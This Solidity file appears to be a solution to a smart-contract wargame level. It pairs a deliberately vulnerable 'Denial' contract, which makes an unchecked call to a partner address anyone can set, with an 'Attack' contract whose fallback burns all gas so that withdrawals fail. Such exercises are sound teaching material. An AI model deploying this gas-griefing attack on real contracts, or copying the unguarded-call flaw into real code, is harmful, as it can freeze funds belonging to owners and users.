pragma solidity ^0.8;

interface IDenial {
    function setWithdrawPartner(address) external;
}

contract Attack {
    constructor(IDenial target) {
        target.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        // Burn all gas
        assembly {
            invalid()
        }
        // another way to burn all gas
        // while (true) {}

        // for solidty < 0.8.0
        // assert(false)
    }
}

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
